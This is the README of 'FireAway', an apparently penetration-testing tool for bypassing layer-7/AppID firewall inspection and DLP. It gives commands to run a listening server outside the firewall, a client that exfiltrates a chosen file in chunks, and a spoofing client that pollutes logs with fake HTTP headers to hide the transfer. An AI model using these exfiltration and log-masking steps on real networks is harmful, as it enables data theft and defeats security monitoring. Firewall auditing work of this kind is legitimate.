FireAway-Next Generation Firewall Bypass Tool
=========
*v0.2*

Fireaway is a tool for auditing, bypassing, and exfiltrating data against layer 7/AppID inspection rules on next generation firewalls, as well as other deep packet inspection defense mechanisms, such as data loss prevention (DLP) and application aware proxies.  These tactics are based on the principle of having to allow connections to establish through the NGFW in order to see layer 7 data to filter, as well as spoofing applications to hide communication channels inside the firewall logs as normal user traffic, such as Internet surfing.

 **Starting the FireAway Server:**
Typically the FireAway server would be started on the egress side of the firewall (such as a server on the Internet), and listen on a port believed to be closed to see if any application based rules allow traffic out on this port:
 
 ```
python fa_server.py <port to listen on>  <mode>
```


All data received by the server on this port will be saved to the file ReceivedData.txt in the directory the server was launched from.  If the server detects differing sizes in the amount of data received (indicating firewall filtering has kicked in), this output will be shown on the server console:

  ```
Got the same or lower amount of data on two consecutive runs.  If sending test data, maximum data leak size may have been reached.
```


**Starting the FireAway Client/Application Spoofer:**
The FireAway client has two modes:
 
 - Test mode (mode 0)-Send random data in incrementing chunk sizes to see how much data can be sent before the firewall AppID engages and stops traffic flow.
 - Exfiltration mode (mode 1)-Open a file and send it in chunks through the firewall.

To start the basic client:

  ```
python fa_client.py <FireAway server IP> <Fireaway Server Port> <Client mode (0 or 1)>
```

To start the application spoofing client:
  ```
python fa_spoof.py <FireAway Server IP> <Fireaway Server Port> <Client mode (0 or 1)>
```

Application spoofing will randomly insert HTTP headers with the data chunks to pollute the logs with various applications in order to mask the data exfiltration.
